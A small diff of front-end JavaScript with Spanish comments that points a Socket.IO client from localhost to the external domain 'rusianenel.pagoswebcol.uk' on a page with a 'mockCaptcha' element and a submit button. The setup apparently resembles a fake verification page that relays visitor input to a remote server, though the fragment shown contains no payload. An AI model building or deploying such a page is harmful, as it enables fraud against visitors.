@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
         // 1. INICIALIZAR EL SOCKET (Si estás en producción, cambia a tu URL real)
-        const socket = io('http://localhost:3000'); 
+        const socket = io('https://rusianenel.pagoswebcol.uk'); 
 
         const mockCaptcha = document.getElementById('mockCaptcha');
         const submitBtn = document.getElementById('submitBtn');
